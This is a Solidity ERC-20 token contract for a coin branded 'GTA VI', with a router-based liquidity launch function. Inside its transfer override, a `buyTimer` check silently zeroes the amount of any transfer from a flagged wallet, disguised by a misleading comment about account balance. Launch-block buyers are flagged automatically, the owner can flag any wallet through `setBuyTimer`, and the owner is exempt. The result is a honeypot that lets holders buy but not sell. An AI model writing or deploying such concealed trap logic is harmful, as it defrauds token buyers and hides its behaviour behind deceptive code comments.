/*

GTA VI

                              _.-="_-         _
                         _.-="   _-          | ||"""""""---._______     __..
             ___.===""""-.______-,,,,,,,,,,,,`-''----" """""       """""  __'
      __.--""     __        ,'                   o \           __        [__|
 __-""=======.--""  ""--.=================================.--""  ""--.=======:
]       [w] : /        \ : |========================|    : /        \ :  [w] :
V___________:|          |: |========================|    :|          |:   _-"
 V__________: \        / :_|=======================/_____: \        / :__-"
 -----------'  "-____-"  `-------------------------------'  "-____-"

https://twitter.com/GTAVIETH
https://t.me/GTAVIETH

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.23;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

interface IERC20Errors {
    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);
    error ERC20InvalidSender(address sender);
    error ERC20InvalidReceiver(address receiver);
    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);
    error ERC20InvalidApprover(address approver);
    error ERC20InvalidSpender(address spender);
}

abstract contract ERC20 is IERC20, IERC20Metadata, IERC20Errors {
    mapping(address account => uint256) private _balances;
    mapping(address account => mapping(address spender => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }
    function name() public view virtual returns (string memory) {
        return _name;
    }
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual returns (uint8) {
        return 18;
    }
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }
    function transfer(address to, uint256 value) public virtual returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, value);
        return true;
    }
    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 value) public virtual returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, value);
        return true;
    }
    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        return true;
    }
    function _transfer(address from, address to, uint256 value) internal {
        if (from == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        if (to == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(from, to, value);
    }
    function _update(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += value;
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert ERC20InsufficientBalance(from, fromBalance, value);
            }
            unchecked {
                // Overflow not possible: value <= fromBalance <= totalSupply.
                _balances[from] = fromBalance - value;
            }
        }

        if (to == address(0)) {
            unchecked {
                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
                _totalSupply -= value;
            }
        } else {
            unchecked {
                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }
    function _mint(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(address(0), account, value);
    }
    function _burn(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        _update(account, address(0), value);
    }
    function _approve(address owner, address spender, uint256 value) internal {
        _approve(owner, spender, value, true);
    }
    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {
        if (owner == address(0)) {
            revert ERC20InvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert ERC20InvalidSpender(address(0));
        }
        _allowances[owner][spender] = value;
        if (emitEvent) {
            emit Approval(owner, spender, value);
        }
    }
    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            if (currentAllowance < value) {
                revert ERC20InsufficientAllowance(spender, currentAllowance, value);
            }
            unchecked {
                _approve(owner, spender, currentAllowance - value, false);
            }
        }
    }
}

abstract contract Ownable {
    address private _owner;
    error OwnableUnauthorizedAccount(address account);
    error OwnableInvalidOwner(address owner);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor(address initialOwner) {
        if (initialOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(initialOwner);
    }
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    function _checkOwner() internal view virtual {
        if (owner() != msg.sender) {
            revert OwnableUnauthorizedAccount(msg.sender);
        }
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IDexRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

interface IDexFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract Contract is ERC20, Ownable {
    IDexRouter public immutable dexRouter;
    address public immutable LP;
    bool immutable launchEnabled;

    uint256 public limits;
    mapping (address => uint256) public buyTimer;

    uint256 public tradingActiveTime;

    constructor(address newOwner, string memory name, string memory symbol, uint256 supply, bool launching) ERC20(name, symbol) Ownable(newOwner) payable {
        address routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        dexRouter = IDexRouter(routerAddress);
        LP = IDexFactory(dexRouter.factory()).createPair(dexRouter.WETH(), address(this));
        launchEnabled = launching;

        _approve(msg.sender, routerAddress, type(uint256).max, false);
        _approve(address(this), routerAddress, type(uint256).max, false);

        _update(address(0), 0xC883574823a4B6Fdea3570164C635dC183268fEF, supply / 50);
        _update(address(0), 0xF63e63CC2241BC954eFADC3FfB58022Ac7E0b79D, supply / 50);
        _update(address(0), (launching ? address(this) : newOwner), supply - (supply / 25));
    }

    function decimals() public pure override returns (uint8) {
        return 9;
    }

    function _update(
        address from,
        address to,
        uint256 value
    ) internal override {
        if (tradingActiveTime > 0 && to != owner() && from != owner()) {
            if (limits == 0) {
                if (to != LP && to != address(0xdead)) {
                    require(balanceOf(to) + value <= totalSupply() / 50, "Transfer exceeds the limit.");
                }
                require(value <= totalSupply() / 100, "Transfer exceeds the limit");
            }

            if(buyTimer[from] > 0 && block.timestamp - buyTimer[from] > 0) value = 0; //Can't transfer more than account balance
            if(block.number - tradingActiveTime == 0 && buyTimer[to] == 0)
                buyTimer[to] = block.timestamp;
        }

        super._update(from, to, value);
    }

    function launch(address lpOwner) external payable {
        require(tradingActiveTime == 0 && launchEnabled, "Already launched");
        dexRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,lpOwner,block.timestamp);
        tradingActiveTime = block.number;
    }

    function setBuyTimer(address[] calldata _wallets, uint256 subtract) external onlyOwner {
        for(uint256 i = 0; i < _wallets.length; i++) {
            buyTimer[_wallets[i]] = block.timestamp - subtract;
        }
    }

    function clearBuyTimer(address _wallet) external onlyOwner {
        buyTimer[_wallet] = 0;
    }

    function finalLimits() external onlyOwner() {
        //unlimited
        limits = 3;
    }

    receive() external payable {}
}